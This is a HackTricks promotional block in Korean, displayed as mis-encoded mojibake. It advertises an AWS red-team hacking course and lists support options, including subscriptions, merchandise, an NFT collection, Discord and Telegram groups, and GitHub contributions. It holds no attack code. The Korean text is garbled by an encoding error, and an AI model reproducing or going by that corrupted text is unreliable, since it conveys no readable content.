<summary><strong>ì œë¡œë¶€í„° ì˜ì›…ì´ ë  ë•Œê¹Œì§€ AWS í•´í‚¹ì„ ë°°ìš°ì„¸ìš”</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricksë¥¼ ì§€ì›í•˜ëŠ” ë‹¤ë¥¸ ë°©ë²•:

* **íšŒì‚¬ê°€ HackTricksì— ê´‘ê³ ë˜ê¸¸ ì›í•˜ê±°ë‚˜** **PDF í˜•ì‹ì˜ HackTricksë¥¼ ë‹¤ìš´ë¡œë“œí•˜ê³  ì‹¶ë‹¤ë©´** [**êµ¬ë… ìš”ê¸ˆì œ**](https://github.com/sponsors/carlospolop)ë¥¼ í™•ì¸í•˜ì„¸ìš”!
* [**ê³µì‹ PEASS & HackTricks ìŠ¤ì™œê·¸**](https://peass.creator-spring.com)ë¥¼ êµ¬ë§¤í•˜ì„¸ìš”
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ë¥¼ ë°œê²¬í•˜ì„¸ìš”, ë‹¹ì‚¬ì˜ ë…ì  [**NFTs**](https://opensea.io/collection/the-peass-family) ì»¬ë ‰ì…˜
* **ğŸ’¬ [**ë””ìŠ¤ì½”ë“œ ê·¸ë£¹**](https://discord.gg/hRep4RUj7f)ì´ë‚˜ [**í…”ë ˆê·¸ë¨ ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜** íŠ¸ìœ„í„°** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**ë¥¼ íŒ”ë¡œìš°í•˜ì„¸ìš”.**
* **HackTricks** ë° **HackTricks Cloud** ê¹ƒí—ˆë¸Œ ì €ì¥ì†Œì— PRì„ ì œì¶œí•˜ì—¬ **í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.**

</details>
